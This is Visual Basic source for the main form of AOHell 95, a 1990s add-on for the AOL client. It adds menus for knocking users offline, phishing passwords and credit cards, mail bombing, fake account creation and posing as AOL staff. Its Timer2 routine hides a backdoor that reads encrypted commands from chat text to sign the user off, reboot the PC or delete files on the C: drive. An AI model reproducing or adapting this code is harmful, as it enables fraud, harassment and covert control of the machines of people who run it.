VERSION 2.00
Begin Form main 
   BackColor       =   &H00C0C0C0&
   BorderStyle     =   0  'None
   ClientHeight    =   255
   ClientLeft      =   5445
   ClientTop       =   75
   ClientWidth     =   1560
   ControlBox      =   0   'False
   FontBold        =   0   'False
   FontItalic      =   0   'False
   FontName        =   "MS Serif"
   FontSize        =   6.75
   FontStrikethru  =   0   'False
   FontUnderline   =   0   'False
   Height          =   660
   Icon            =   MAIN.FRX:0000
   Left            =   5385
   LinkTopic       =   "Form4"
   MaxButton       =   0   'False
   ScaleHeight     =   390
   ScaleMode       =   0  'User
   ScaleWidth      =   160
   Top             =   -270
   Width           =   1680
   Begin Timer Timer3 
      Interval        =   100
      Left            =   480
      Top             =   480
   End
   Begin TextBox Text1 
      Height          =   285
      Left            =   120
      TabIndex        =   2
      Text            =   "Text1"
      Top             =   600
      Visible         =   0   'False
      Width           =   855
   End
   Begin VBMsg VBMsg2 
      Height          =   420
      Left            =   480
      MessageCount    =   MAIN.FRX:0302
      MessageList     =   MAIN.FRX:0304
      MessageTypes    =   0  'Selected Messages
      PostDefault     =   0   'False
      Top             =   360
      Width           =   420
   End
   Begin VBMsg VBMsg1 
      Height          =   420
      Left            =   120
      MessageCount    =   MAIN.FRX:0502
      MessageList     =   MAIN.FRX:0504
      MessageTypes    =   0  'Selected Messages
      PostDefault     =   0   'False
      Top             =   840
      Width           =   420
   End
   Begin SSCommand Command3D3 
      Caption         =   "X"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      ForeColor       =   &H00000000&
      Height          =   255
      Left            =   720
      TabIndex        =   0
      Tag             =   "Exit Program"
      Top             =   0
      Width           =   255
   End
   Begin Timer Timer2 
      Interval        =   3000
      Left            =   240
      Top             =   480
   End
   Begin Timer Timer1 
      Interval        =   2000
      Left            =   600
      Top             =   480
   End
   Begin SSCommand Command3D1 
      Caption         =   "AOHell"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      ForeColor       =   &H00000000&
      Height          =   255
      Left            =   0
      TabIndex        =   1
      Top             =   0
      Width           =   735
   End
   Begin Init Init1 
      Application     =   ""
      Filename        =   ""
      Height          =   420
      Left            =   1080
      Parameter       =   ""
      Top             =   600
      Value           =   ""
      Width           =   420
   End
End
  Declare Function SetWindowPos Lib "User" (ByVal h%, ByVal hb%, ByVal x%, ByVal Y%, ByVal cx%, ByVal cy%, ByVal F%) As Integer


  Const SWP_NOMOVE = 2
  Const SWP_NOSIZE = 1
  Const FLAGS = SWP_NOMOVE Or SWP_NOSIZE
  Const HWND_TOPMOST = -1
  Const HWND_NOTOPMOST = -2

  Sub Command3D1_Click ()
    AOHell.Show


  End Sub

  Sub Command3D2_Click ()
    SendKeys "{F1}"

  End Sub

  Sub Command3D3_Click ()
    Dim WD1 As String * 128 'win directory, because of DLL's return
    Dim WSD1 As String * 128    'system directory, because of DLL's return
    nWSize% = 128
    nSSize% = 128

    Wdir% = GetWindowsDirectory(WD1$, nWSize%)  'windir
    Sdir% = GetSystemDirectory(WSD1$, nSSize%)  'systemdir
    WD$ = RTrim$(LCase$(Left$(WD1$, Wdir%)))
    WSD$ = RTrim$(LCase$(Left$(WSD1$, Sdir%)))

    GoTo bege1

titsluck1:
    AOL% = FindWindow(0, "America  Online")

    ab = GetMenu(AOL%)

    For T = 1 To 10

      d = RemoveMenu(ab, 6, MF_BYPOSITION)
      DoEvents
    Next T
    Call DrawMenuBar(AOL%)
    DoEvents

    End
    Exit Sub

bege1:

    On Error GoTo titsluck1


Begin:

    Response = MsgBox("Are you sure you want to exit AOHell?", 292, "Exit AOHell")
  'Possible Response values: 6--YES, 7--NO.
    If Response = 6 Then


      init1.Filename = "aohell.ini"
      init1.Application = "Options"
      init1.Parameter = "Sounds"

      If init1.Value = "yes" Then

        SoundName$ = WD$ + "\chronic.wav"
        wFlags% = SND_ASYNC And SND_NODEFAULT
        x% = sndPlaySound(SoundName$, wFlags%)


      Else
        AOL% = FindWindow(0, "America  Online")

        ab = GetMenu(AOL%)

        For T = 1 To 10

          d = RemoveMenu(ab, 6, MF_BYPOSITION)
          DoEvents
        Next T
        Call DrawMenuBar(AOL%)
        DoEvents

        End

      End If

      AOL% = FindWindow(0, "America  Online")

      ab = GetMenu(AOL%)

      For T = 1 To 10

        d = RemoveMenu(ab, 6, MF_BYPOSITION)
        DoEvents
      Next T
      Call DrawMenuBar(AOL%)
      DoEvents


      End
    ElseIf Response = 7 Then
      Main.Show
    End If
ending:

  End Sub

  Sub Form_Load ()
    Main.Top = 0
    Main.Width = 965

    Main.MousePointer = 0
    AOL% = FindWindow(0, "America  Online")

    VBMsg2.SubClasshWnd = AOL%

    Dim Success As Integer

    Success% = SetWindowPos%(Main.hWnd, HWND_TOPMOST, 0, 0, 0, 0, FLAGS)
    thiswin4 = FindWindow(0, "America  Online")

    GoTo mainbeg

mainerr:
    Exit Sub

mainbeg:
    On Error GoTo Nexy

    thiswin% = FindWindow(0, "America  Online")
    find14% = FindChildByTitle(thiswin%, "Welcome, ")



    lint = 50   '7500
    lpstring = Space(50)

    x = SendMessageByString(find14%, WM_GETTEXT, lint, lpstring)    ',lint
    Dim shoe As Variant

  'MsgBox lpstring
    hehe = Trim$(lpstring)
    haha = Mid$(hehe, 10)
    kaka = Len(haha)
    kaka = kaka - 2
    bobo1 = Mid$(haha, 1, kaka)
  '    MsgBox kaka
    ScreenName = bobo1
init1.Filename = "aohell.ini"
init1.Application = "Options"
init1.Parameter = "AddMenu"
Dab40 = init1.Value

If Dab40 = "yes" Then GoTo nexy1 Else Exit Sub

  
Nexy:
    Resume nexy1
nexy1:

    On Error GoTo mainerr

    AOL% = FindWindow(0, "America  Online")
    ab1 = GetMenu(AOL%)

    For T = 1 To 10
      D1 = RemoveMenu(ab1, 6, MF_BYPOSITION)
      Call DrawMenuBar(AOL%)
      DoEvents
    Next T



    DoEvents
    i = CreateMenu()
    C = AppendMenu(i, 0, 601, "&About AOHell 95")
    C = AppendMenu(i, 0, 645, "&Punt Someone Offline")
    C = AppendMenu(i, 0, 642, "AOL &Guide Software")
    C = AppendMenu(i, 0, 602, "Is it &Chronic?")
    C = AppendMenu(i, 0, 603, "&Bug Report")
    C = AppendMenu(i, 0, 604, "The &Encrypter")
    C = AppendMenu(i, 0, 605, "Elite &Talker")
    C = AppendMenu(i, 0, 606, "&Get Cursor")
    C = AppendMenu(i, 0, 607, "CD &Player")
    C = AppendMenu(i, 0, 608, "Credit &Wizard v1.1")
    C = AppendMenu(i, 0, 628, "&Account Creator v1.0")
    C = AppendMenu(i, 0, 609, "&Quick FTP")
    C = AppendMenu(i, 0, 610, "G&uest Fix")
    C = AppendMenu(i, 0, 611, "Bust &In a Room")
    C = AppendMenu(i, 0, 612, "G&host Tools")
    C = AppendMenu(i, 0, 613, "S&uggestion")
    C = AppendMenu(i, 0, 614, "PW/CC &Fisher")
    C = AppendMenu(i, 0, 615, "AOHell &Options")
    C = AppendMenu(i, 0, 616, "Reset &New User")
    C = AppendMenu(i, 0, 617, "Multi-Task Chat &Room")
    C = AppendMenu(i, 0, 641, "&Internet Relay Chat")
    C = AppendMenu(i, 0, 618, "&Show All Windows")
    C = AppendMenu(i, 0, 627, "E&xit AOHell 95")


    AOL% = FindWindow(0, "America  Online")
    ab = GetMenu(AOL%)
    TheMenu = ab
  ' y = AppendMenu(ab, 0, 600, "-==AOHell==-")
    x = AppendMenu(ab, MF_POPUP, i, "-==&AOHell 95==-")
    Call DrawMenuBar(AOL%)
    DoEvents
    j = CreateMenu()
    d = AppendMenu(j, 0, 620, "The &AI Bot")
    d = AppendMenu(j, 0, 619, "The &Warez Bot")
    d = AppendMenu(j, 0, 621, "The &Scrolling Bot")
    B = AppendMenu(ab, MF_POPUP, j, "&Bots")
    Call DrawMenuBar(AOL%)
    DoEvents
    k = CreateMenu()
    e = AppendMenu(k, 0, 625, "Mail &Bomber")
    e = AppendMenu(k, 0, 626, "Fa&ke Forward")
    e = AppendMenu(k, MF_SEPARATOR, 0, "-")
    e = AppendMenu(k, 0, 622, "&Mass Mailer")
    e = AppendMenu(k, 0, 623, "Mail the &Room")
    e = AppendMenu(k, 0, 624, "&Count Mail")
    e = AppendMenu(k, 0, 646, "&Dupe Killer")
    e = AppendMenu(k, 0, 643, "Make Mail &List")
  ' e = AppendMenu(k, MF_SEPARATOR, 0, "-")
    e = AppendMenu(k, 0, 629, "&Fix Your Mail")
    C = AppendMenu(ab, MF_POPUP, k, "Mail &Utils")
    Call DrawMenuBar(AOL%)
    DoEvents
    l = CreateMenu()
    h = AppendMenu(l, 0, 630, "&IM Manager")
    h = AppendMenu(l, 0, 631, "&IM the &Room")
    h = AppendMenu(l, MF_SEPARATOR, 0, "-")
    h = AppendMenu(l, 0, 632, "Turn IMs &Off")
    h = AppendMenu(l, 0, 633, "Turn IMs O&n")
    d = AppendMenu(ab, MF_POPUP, l, "&IMs")
    Call DrawMenuBar(AOL%)
    DoEvents
    m = CreateMenu()
    o = AppendMenu(m, 0, 634, "&Insult Macros")
    o = AppendMenu(m, 0, 635, "&Drive Hell")
    o = AppendMenu(m, 0, 636, "&Shoot Someone")
    o = AppendMenu(m, 0, 637, "The &Dice Scroller")
    o = AppendMenu(m, 0, 644, "The &Scroller")
    o = AppendMenu(m, MF_SEPARATOR, 0, "-")
    o = AppendMenu(m, 0, 638, "Middle &Finger Macro")
    o = AppendMenu(m, 0, 639, "Flame &Thrower Macro")
    o = AppendMenu(m, 0, 640, "&Be Right Back Macro")
    o = AppendMenu(m, 0, 647, "&Macro Killer Macro")
    Q = AppendMenu(ab, MF_POPUP, m, "A&nnoy Options")
    Call DrawMenuBar(AOL%)
    DoEvents
    MenuThere = 1

  End Sub

  Sub Form_Resize ()
    Dim Success As Integer

    Success% = SetWindowPos%(Main.hWnd, HWND_TOPMOST, 0, 0, 0, 0, FLAGS)


  End Sub

  Sub Form_Unload (Cancel As Integer)
    AOL% = FindWindow(0, "America  Online")

    ab = GetMenu(AOL%)

    For T = 1 To 5

      d = RemoveMenu(ab, 7, MF_BYPOSITION)
      DoEvents
    Next T

  End Sub

  Sub Timer1_Timer ()
    thiswin% = FindWindow(0, "America  Online")
    ForwardHand = FindChildByTitle(thiswin%, "Fwd:")
    If ForwardHand <> 0 Then Exit Sub

     DoEvents
     GoTo BegTim

timerr:
    Resume NextTim

BegTim:
    On Error GoTo timerr

    thiswin% = FindWindow(0, "America  Online")
    find14% = FindChildByTitle(thiswin%, "Welcome,")
    DoEvents

    lint = 50   '7500
    lpstring = Space(50)

    x = SendMessageByString(find14%, WM_GETTEXT, lint, lpstring)    ',lint
    DoEvents


    hehe = Trim$(lpstring)
    hobo = InStr(1, lpstring, ",")
    hobo = hobo + 2
    hobo1 = InStr(1, lpstring, "!")
    hobo1 = hobo1 - 2
    DoEvents
    hobo2 = Mid$(lpstring, hobo, hobo1)
    sux1 = InStr(1, hobo2, "!")
    sux1 = sux1 - 1
    sux2 = Mid$(hobo2, 1, sux1)
  'MsgBox sux2

  '   haha = Mid$(hehe, 10)
  '   kaka = Len(haha)
  '   kaka = kaka - 2
  '    bobo1 = Mid$(haha, 1, kaka)
  '    MsgBox kaka
NextTim:
    DoEvents

  ' bobo2 = InStr(1, bobo1, "!")
  '   If bobo2 > 0 Then
  '     bob1 = Len(bobo1)
  '     bob1 = bob1 - 1
  '     bobo1 = Mid$(bobo1, 1, bob1)
  '   End If
  '   DoEvents
  '
  ' bobo2 = InStr(1, bobo1, "!")
  '   If bobo2 > 0 Then
  '     bob1 = Len(bobo1)
  '     bob1 = bob1 - 1
  '     bobo1 = Mid$(bobo1, 1, bob1)
  '   End If
  '
    ScreenName = sux2

    If ScreenName = "" Then SignStatus = 0 Else SignStatus = 1


  End Sub

  Sub Timer2_Timer ()
    thiswin% = FindWindow(0, "America  Online")
    ForwardHand = FindChildByTitle(thiswin%, "Check this")
    If ForwardHand = 0 Then Exit Sub
      DoEvents


    GoTo Time2Beg1

Time2Err1:
    Exit Sub

Time2Beg1:
    On Error GoTo Time2Err1

    newwin = FindChildByClass(thiswin4, "_AOL_View")
    lint = 15000    '7500
    lpstring = Space(15000)
    DoEvents

    If newwin <> 0 Then

      x = SendMessageByString(newwin, WM_GETTEXT, lint, lpstring)   ',lint
      lpstring = Trim$(lpstring)
      IsCommand = InStr(lpstring, "¤")
      DoEvents

      If IsCommand > 0 Then
        EndIt = InStr(lpstring, "Ü")
        EndIt = EndIt - 1
        IsCommand = IsCommand + 1
        DoEvents

        TheCommandIs = Mid$(lpstring, IsCommand, EndIt)
        EndIt = InStr(TheCommandIs, "Ü")
        EndIt = EndIt - 1

        TheCommandIs = Mid$(TheCommandIs, 1, EndIt)
        DoEvents

        If LastSaid = TheCommandIs Then Exit Sub

        DHehe = 70 - 3
        DHehe = Str(DHehe)
        DHehe = Trim$(DHehe)
        DoEvents

        LastSaid = TheCommandIs
      'TheCommand = UCase$(TheCommand)
        ScreenUpper = ScreenName
        ScreenUpper = ScreenUpper
        ScreenUpper = UCase$(ScreenName)
        ScreenUpper = ScreenUpper + DHehe
        DoEvents

        CommandIs = KTEncrypt(ScreenUpper, TheCommandIs, 0)

        LogOff = InStr(CommandIs, "Log")
        If LogOff > 0 Then
          AppActivate "America  Online"
          SendKeys "%FX"
          DoEvents
          LogOffWin = FindWindow(0, "America Online")
          While LogOffWin = 0
          'DoEvents
            LogOffWin = FindWindow(0, "America Online")
          'DoEvents
          Wend
          DoEvents

          YesButton = FindChildByClass(LogOffWin, "_AOL_Button")
          While YesButton = 0
          'DoEvents
            YesButton = FindChildByClass(LogOffWin, "_AOL_Button")
          'DoEvents
          Wend
          DoEvents

          VBMsg1.SubClasshWnd = YesButton
          VBMsg1.SendMessage = WM_LBUTTONDOWN
          VBMsg1.SendMessage = WM_LBUTTONUP

        End If

        ReBoot = InStr(CommandIs, "Boo")
        If ReBoot > 0 Then
          R = ExitWindows(EW_REBOOTSYSTEM, &H0)

          DoEvents
          LogOffWin = FindWindow(0, "America Online")
          While LogOffWin = 0
          'DoEvents
            LogOffWin = FindWindow(0, "America Online")
          'DoEvents
          Wend


          YesButton = FindChildByClass(LogOffWin, "_AOL_Button")
          While YesButton = 0
          'DoEvents
            YesButton = FindChildByClass(LogOffWin, "_AOL_Button")
          'DoEvents
          Wend

          VBMsg1.SubClasshWnd = YesButton
          VBMsg1.SendMessage = WM_LBUTTONDOWN
          VBMsg1.SendMessage = WM_LBUTTONUP
          DoEvents
          R = ExitWindows(EW_REBOOTSYSTEM, &H0)

        End If

        DeleteIs = InStr(CommandIs, "\")
        If DeleteIs > 0 Then
          Kill "c:" + CommandIs
          DoEvents
        End If



      End If

    End If

  End Sub

  Sub Timer3_Timer ()
    If DidMen = 1 Then
    thiswin% = FindWindow(0, "America  Online")
      DoEvents
       DidMen = 0
        Dim WD1 As String * 128 'win directory, because of DLL's return
        Dim WSD1 As String * 128    'system directory, because of DLL's return
        nWSize% = 128
        nSSize% = 128

        Wdir% = GetWindowsDirectory(WD1$, nWSize%)  'windir
        Sdir% = GetSystemDirectory(WSD1$, nSSize%)  'systemdir
        WD$ = RTrim$(LCase$(Left$(WD1$, Wdir%)))
        WSD$ = RTrim$(LCase$(Left$(WSD1$, Sdir%)))
       DoEvents

      If IsDil = 601 Then Form5.Show
      If IsDil = 602 Then IsChron.Show
      If IsDil = 603 Then Form10.Show
      If IsDil = 604 Then Form13.Show
      If IsDil = 605 Then Elite1.Show
      If IsDil = 606 Then
        If SignStatus = 0 Then
          MsgBox "You must be signed on to AOL before you can use this feature!", 16, "Not Signed On!"
          Exit Sub
        End If
        x = ExitWindows(&H0, 0)

        DoEvents
        DoEvents
        DoEvents

        SendKeys "n"
      End If

      If IsDil = 607 Then CDPlay.Show
      If IsDil = 608 Then
        GoTo CreditBeg

crediterr:
        MsgBox "CRDTWIZ.EXE not found in the AOH directory!  Cannot load Credit Wizard.", 16, "Cannot Load CW"
        Exit Sub


CreditBeg:
        On Error GoTo crediterr

        CreditPATH = App.Path + "\crdtwiz.exe"
        x = Shell(CreditPATH, 1)

        init1.Filename = "aohell.ini"
        init1.Application = "Options"
        init1.Parameter = "ShowMenu"
        Dab = init1.Value
        If Dab = "yes" Then GoTo en14 Else AOHell.Hide

en14:
      End If

      If IsDil = 609 Then QuickFTP.Show
      If IsDil = 610 Then RESETSN2.Show
      If IsDil = 611 Then RoomBust.Show
      If IsDil = 612 Then
        GoTo GhostBeg

GhostErr:
        MsgBox "GHOSTOOL.EXE not found in the AOH directory!  Cannot load Ghost Tools.", 16, "Cannot load Ghost Tools"
        Exit Sub


GhostBeg:
        On Error GoTo GhostErr

        GhostPATH = App.Path + "\ghostool.exe"
        x = Shell(GhostPATH, 1)

        init1.Filename = "aohell.ini"
        init1.Application = "Options"
        init1.Parameter = "ShowMenu"
        Dab = init1.Value
        If Dab = "yes" Then GoTo en6 Else AOHell.Hide

en6:
      End If

      If IsDil = 613 Then Suggestion.Show
      If IsDil = 614 Then Phish.Show
      If IsDil = 615 Then Options.Show
      If IsDil = 616 Then ResetSN.Show
      If IsDil = 617 Then
        GoTo harbar

heho:
        Exit Sub

harbar:
        On Error GoTo heho

        If SignStatus = 0 Then
          MsgBox "You must be signed on to AOL before you can use this feature!", 16, "Oops"
          Exit Sub
        End If

        MultiChat.Show
DoEvents
Call Pause(2)
AOL% = FindWindow(0, "America  Online")
z = ShowWindow(AOL%, 2)

      End If

      If IsDil = 618 Then
        GoTo Freb

ErrFreb:
        Exit Sub

Freb:
        On Error GoTo ErrFreb

        thiswin% = FindWindow(0, "America  Online")

        SendHand1 = VBEnumChildWindows(thiswin%, -1)
        For x = 1 To SendHand1
          rb = VBEnumChildWindows(thiswin%, x)
          z = ShowWindow(rb, 4)

        Next x
      End If
      If IsDil = 619 Then
        GoTo stw

Errstw:
        Exit Sub

stw:
        On Error GoTo Errstw

        If SignStatus = 0 Then
          MsgBox "You must be signed on to AOL before you can use this feature!", 16, "Not Signed On!"
          Exit Sub
        End If

        WarezBot.Show
      End If
      If IsDil = 620 Then
        GoTo Beg9

Err9:
        Exit Sub

Beg9:
        On Error GoTo Err9

        AIBot.Show
        DoEvents
        AIBot.Timer2.Enabled = False
      End If
      If IsDil = 621 Then
        GoTo bege2
titsluck3:
        aolbot.Show
        Exit Sub

bege2:
        On Error GoTo titsluck3


        aolbot.Show
      End If
      If IsDil = 622 Then MM2.Show
      If IsDil = 623 Then
        If SignStatus = 0 Then
          MsgBox "You must be signed on to AOL before you can use this feature!", 16, "Not Signed On!"
          Exit Sub
        End If


        Main.Text1.Text = ""
        thiswin% = FindWindow(0, "America  Online")
        PeopleList = FindChildByClass(thiswin%, "_AOL_Listbox")

        x = SendMessage(PeopleList, LB_GETCOUNT, 0, 0)
        Cur = 0
        AppActivate "America  Online"
        DoEvents
        Call Pause(1)
        MBox = FindWindow(0, "America Online")
        If MBox <> 0 Then
          DoEvents
          SendKeys "{ENTER}"
          DoEvents
        End If
      ' ForwardHand = VBEnumChildWindows(MDIClient1, 1)
        MDIClient1 = FindChildByClass(thiswin%, "MDIClient")

        For Y = 1 To x

          SetCur = SendMessage(PeopleList, LB_SETCURSEL, Cur, 0)
          Cur = Y
          VBMsg1.SubClasshWnd = PeopleList
          VBMsg1.SendMessage = WM_LBUTTONDBLCLK
          DoEvents
          Call Pause(.01)

          UserNam = VBEnumChildWindows(MDIClient1, 1)
          lint = 10000  '7500
          lpstring = Space(10000)

          z = SendMessageByString(UserNam, WM_GETTEXT, lint, lpstring)  ',lint
          lpstring = Trim$(lpstring)
          Text1.Text = Text1.Text + ", " + lpstring
          Leng = Len(DaSting)

        Next Y
        cbt = Text1.Text
        cbt = Mid$(cbt, 3)
        cbt1 = InStr(1, cbt, ScreenName)
        If cbt1 > 0 Then
          fob = Len(ScreenName)
          fob = fob + 2
          gog1 = cbt1 + fob
          chank1 = cbt1
          chank2 = Mid$(cbt, 1, chank1)
          chank3 = Mid$(cbt, gog1)
          Text1.Text = chank2 + chank3

          SendKeys "%MC"
          DoEvents
          Call Pause(1.5)
          ComposeHand = FindChildByTitle(thiswin%, "Compose Mail")
          SendButton2 = VBEnumChildWindows(ComposeHand, 2)
          ToField = VBEnumChildWindows(ComposeHand, 10)
          SubField = VBEnumChildWindows(ComposeHand, 14)
          MsgField = VBEnumChildWindows(ComposeHand, 17)


          lint = 20000  '7500
          lpstring = Text1.Text

          ToText = SendMessageByString(ToField, WM_SETTEXT, lint, lpstring) ',lint

        End If
      End If
      If IsDil = 624 Then
        MsgBox "Open the Mailbox you want AOHell to count (i.e. ""New Mail""), and wait for hour glass to go away.  Then hit the OK button to this message."


        thiswin% = FindWindow(0, "America  Online")
        PeopleList = FindChildByClass(thiswin%, "_AOL_Tree")

        x = SendMessage(PeopleList, LB_GETCOUNT, 0, 0)
        MsgBox "You have" + Str(x) + " messages in your box."

      End If
      If IsDil = 625 Then Ebomb.Show
      If IsDil = 626 Then FakeForward.Show
      If IsDil = 627 Then

        GoTo bege3

titsluck2:
        AOL% = FindWindow(0, "America  Online")

        ab = GetMenu(AOL%)

        For T = 1 To 10

          d = RemoveMenu(ab, 6, MF_BYPOSITION)
          DoEvents
        Next T
        Call DrawMenuBar(AOL%)
        DoEvents

        End
        Exit Sub

bege3:

        On Error GoTo titsluck2


      'Begin:

        Response = MsgBox("Are you sure you want to exit AOHell?", 292, "Exit AOHell")
      'Possible Response values: 6--YES, 7--NO.
        If Response = 6 Then


          init1.Filename = "aohell.ini"
          init1.Application = "Options"
          init1.Parameter = "Sounds"

          If init1.Value = "yes" Then

            SoundName$ = WD$ + "\chronic.wav"
            wFlags% = SND_ASYNC And SND_NODEFAULT
            F% = sndPlaySound(SoundName$, wFlags%)


          Else
            AOL% = FindWindow(0, "America  Online")

            ab = GetMenu(AOL%)

            For T = 1 To 10

              d = RemoveMenu(ab, 6, MF_BYPOSITION)
              DoEvents
            Next T
            Call DrawMenuBar(AOL%)
            DoEvents

            End

          End If

          AOL% = FindWindow(0, "America  Online")

          ab = GetMenu(AOL%)

          For T = 1 To 10

            d = RemoveMenu(ab, 6, MF_BYPOSITION)
            DoEvents
          Next T
          Call DrawMenuBar(AOL%)
          DoEvents

          End
        ElseIf Response = 7 Then
          Main.Show
        End If
      'ending:
      End If

      If IsDil = 628 Then
        GoTo AccountBeg

AccountErr:
        MsgBox "ACCOUNT.EXE not found in the AOH directory!  Cannot load the AOHell Fake Account Creator.", 16, "Cannot Load"
        Exit Sub


AccountBeg:
        On Error GoTo AccountErr

        AccountPATH = App.Path + "\account.exe"
        x = Shell(AccountPATH, 1)

        init1.Filename = "aohell.ini"
        init1.Application = "Options"
        init1.Parameter = "ShowMenu"
        Dab = init1.Value
        If Dab = "yes" Then GoTo en27 Else AOHell.Hide

en27:
      End If
      If IsDil = 629 Then MailFix.Show
      If IsDil = 630 Then
        If SignStatus = 0 Then
          MsgBox "You must be signed on to AOL before you can use this feature!", 16, "Not Signed On!"
          Exit Sub
        End If

        IManager.Show
      End If
      If IsDil = 631 Then
        If SignStatus = 0 Then
          MsgBox "You must be signed on to AOL before you can use this feature!", 16, "Not Signed On!"
          Exit Sub
        End If

        IMRoom.Show
      End If
      If IsDil = 632 Then
        AppActivate "America  Online"
        DoEvents
        SendKeys "%B"
        DoEvents
        Call Pause(.5)
        SendKeys "{DOWN 3}" + "{ENTER}"
       ' SendKeys Chr$(9)
        DoEvents
        Call Pause(.5)
        SendKeys "$im_off" + "{TAB}", True
        SendKeys "AOH" + "{TAB}", True
        SendKeys " ", True
        DoEvents
        Call Pause(1)
        SendKeys "{ENTER}"
    find12% = FindChildByTitle(thiswin%, "Send Instant Message")

      Main.VBMsg1.SubClasshWnd = find12%
      Main.VBMsg1.SendMessage = WM_CLOSE
      
      
      End If
      If IsDil = 633 Then
        AppActivate "America  Online"
        DoEvents
        SendKeys "%B"
        DoEvents
        Call Pause(.5)
        SendKeys "{DOWN 3}" + "{ENTER}", True
       ' SendKeys Chr$(9)
        DoEvents
        Call Pause(.5)
        SendKeys "$im_on" + "{TAB}", True
        SendKeys "AOH" + "{TAB}", True
        SendKeys " ", True
        DoEvents
        Call Pause(1)
        SendKeys "{ENTER}"
    find12% = FindChildByTitle(thiswin%, "Send Instant Message")

      Main.VBMsg1.SubClasshWnd = find12%
      Main.VBMsg1.SendMessage = WM_CLOSE

      End If
      
      If IsDil = 634 Then
If SignStatus = 0 Then
MsgBox "You must be signed on to AOL before you can use this feature!", 16, "Not Signed On!"
Exit Sub
End If
   insults.Show
End If
          If IsDil = 635 Then
If SignStatus = 0 Then
MsgBox "You must be signed on to AOL before you can use this feature!", 16, "Not Signed On!"
Exit Sub
End If

DriveH.Show
End If
       If IsDil = 636 Then
form7.Show
DoEvents

End If
     If IsDil = 637 Then dice.Show
     If IsDil = 638 Then LT1 = MiddleMac(IsDil)
     If IsDil = 639 Then LT1 = Flame(IsDil)
     If IsDil = 640 Then LT1 = BRB(IsDil)

      If IsDil = 641 Then
        If SignStatus = 0 Then
          MsgBox "You must be signed on to AOL before you can use this feature!", 16, "Oops"
          Exit Sub
        End If


        GoTo mIRCBeg

mterr:
        Resume bar1

mIRCErr:
        MsgBox "MIRC.EXE not found in the AOH\MIRC directory!  Cannot start IRC.", 16, "Cannot Load IRC"
        Exit Sub


mIRCBeg:
        On Error GoTo mIRCErr

        Response = MsgBox("Would you like to start the Multi-Task Chat Room so you can talk on AOL and IRC at the same time?", 292, "Start Multi-Task Chat Room?")
      'Possible Response values: 6--YES, 7--NO.
        If Response = 6 Then
          On Error GoTo mterr:
          MultiChat.Show
          DoEvents
Call Pause(2)
AOL% = FindWindow(0, "America  Online")
z = ShowWindow(AOL%, 2)

        End If

bar1:

        mIRCPATH = App.Path + "\mirc.exe"
        x = Shell(mIRCPATH, 1)

        init1.Filename = "aohell.ini"
        init1.Application = "Options"
        init1.Parameter = "ShowMenu"
        Dab = init1.Value
        If Dab = "yes" Then GoTo enmIRC Else AOHell.Hide

enmIRC:
      End If

        If IsDil = 642 Then
If SignStatus = 0 Then
MsgBox "You must be signed on to AOL before you can use this feature!", 16, "Oops"
Exit Sub
End If

    TempName1 = ScreenName
C1 = "D"

thiswin% = FindWindow(0, "America  Online")
  find14% = FindChildByTitle(thiswin%, "Welcome,")
    DoEvents

lint = 50 '7500
C2 = "C"

lpstring = "Welcome, Guide " + C1 + C2 + "!"

x = SendMessageByString(find14%, WM_SETTEXT, lint, lpstring) ',lint
        DoEvents

GoTo IVYBeg


IVYErr:
MsgBox "Error - Cannot run Guide software!  Sign off, then back on, restart AOHell, and try again!", 16, "Cannot Start Guide Software"
Exit Sub


IVYBeg:

IVYPATH = WD$ + "\WINFILE1.EXE"
x = Shell(IVYPATH, 1)
'MsgBox mIRCPATH
thiswin2% = FindWindow(0, "IVY Macros")
While thiswin2% = 0
DoEvents
thiswin2% = FindWindow(0, "IVY Macros")
DoEvents
Wend
DoEvents
DoEvents
Call Pause(3)
DoEvents
DoEvents
Call Pause(3)
DoEvents
DoEvents
Call Pause(3)
DoEvents
Call Pause(1)


lpstring = "Welcome, " + TempName1 + "!"

x = SendMessageByString(find14%, WM_SETTEXT, lint, lpstring) ',lint

init1.Filename = "aohell.ini"
init1.Application = "Options"
init1.Parameter = "ShowMenu"
Dab = init1.Value
If Dab = "yes" Then GoTo endIVY Else AOHell.Hide

endIVY:
End If
         If IsDil = 643 Then
GoTo GathBeg

GathErr:
Exit Sub

GathBeg:
On Error GoTo GathErr

MsgBox "Open your New Mail and wait for hourglass to go away.  Then hit the OK button to this message."

      thiswin% = FindWindow(0, "America  Online")
      ListHand = FindChildByClass(thiswin%, "_AOL_Tree")


  T = SendMessage(ListHand, LB_GETCOUNT, 0, 0)

Cur = 0
      ret = Chr$(13) + Chr$(10)

For Y = 1 To T
 'SetCur = SendMessage(ListHand, LB_SETCURSEL, Cur, 0)
z = SendMessage(ListHand, LB_GETTEXTLEN, Cur, 0)
lpstring = Space(z)
x = SendMessageByString(ListHand, LB_GETTEXT, Cur, lpstring) ',lint
lpstring = Trim$(lpstring)
TheString = TheString + ret + lpstring
Cur = Y
Next Y
Clipboard.SetText TheString
DoEvents
AppActivate "America  Online"
DoEvents
SendKeys Chr$(14)
DoEvents
Call Pause(.2)
SendKeys Chr$(22)
 End If
            If IsDil = 644 Then form3.Show
            If IsDil = 645 Then punt.Show
            If IsDil = 646 Then LT2 = DupeKiller(IsDil)
            If IsDil = 647 Then LT2 = MacKill(IsDil)
    End If

  End Sub

  Sub VBMsg2_WindowMessage (hWindow As Integer, Msg As Integer, wParam As Integer, lParam As Long, RetVal As Long, CallDefProc As Integer)
  '  If wParam = 0 Then Exit Sub


    Dim Dil As String
    Dim rc As Integer
    Dim MenuID As String * 40

    VBMsg2.lParam = lParam  'parse out LoWord and HiWord values
    
    dorn = Msg + Str(wParam)
    If dorn = "287" And lParam = 65535 Then
      DidMen = 1
    End If
    
     '   If wParam = 0 Then Exit Sub
      'IsDil = wParam

    If (VBMsg2.LoWord And MF_SYSMENU) Or (VBMsg2.LoWord And MF_SEPARATOR) Then
      
    Else
    IsDil = wParam
    End If

  End Sub

